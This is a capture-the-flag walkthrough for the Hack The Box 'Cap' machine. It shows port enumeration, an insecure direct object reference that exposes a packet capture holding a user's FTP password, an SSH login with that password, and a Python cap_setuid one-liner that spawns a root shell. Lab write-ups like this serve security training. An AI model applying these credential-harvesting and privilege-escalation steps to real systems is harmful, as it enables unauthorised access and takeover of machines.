# CTF: [HTB Cap](https://app.hackthebox.eu/machines/Cap)

## Enumeration
```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
```
Navigate the website on port 80. It seems like we are already logged in as the admin. Check out the Security Dashboard.
<br/><br/>
Append a '0' to the URL instead of '1', watch the number of packets go up.
<br/><br/>
http://10.10.10.245/data/1 > http://10.10.10.245/data/0
<br/><br/>
Download the .pcap file. Open the file, somewhere in it should contain some credentials.
```
s�^@^@USER nathan
Vw�`�J^A^@8^@^@^@8^@^@^@^@^D^@^A^@^F^@^L)� �^@^@^H^@E^@^@(su@^@@^F�����^P���^A^@^Uԋ^["\�`�x_P^P^A�      ~^@^@Vw�`$>
Vw�`��^A^@>^@^@^@>^@^@^@^@^@^@^A^@^F^@PV�^@^H^@^@^H^@E^@^@(^N%@^@�^F�G���^A���^Pԋ^@^U`�x_^["]^LP^P^P
p�^@^@^@^@^@^@^@^@Ww�`��^E^@N^@^@^@N^@^@^@^@^@^@^A^@^F^@PV�^@^H^@^@^H^@E^@^@>^N&@^@�^F�0���^A���^Pԋ^@^U`�x_^["]^LP>
J�^@^@PASS Buck3tH4TF0RM3!
```
Log in with these credentials through SSH:
```
$ ssh nathan@10.10.10.245
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Sep 28 11:26:38 UTC 2021

  System load:  0.0               Processes:             223
  Usage of /:   36.7% of 8.73GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.10.245
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ 
```
# user.txt
The user flag should be in Nathan's home directory.
# Privilege escalation
Run `getcap -r / 2>/dev/null`.
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` looks interesting. Find out more about this on [GTFOBins](https://gtfobins.github.io/gtfobins/python/).<br><br/>
"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
Execute this command to escalate to root:
```
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Navigate to /root and find the root flag.
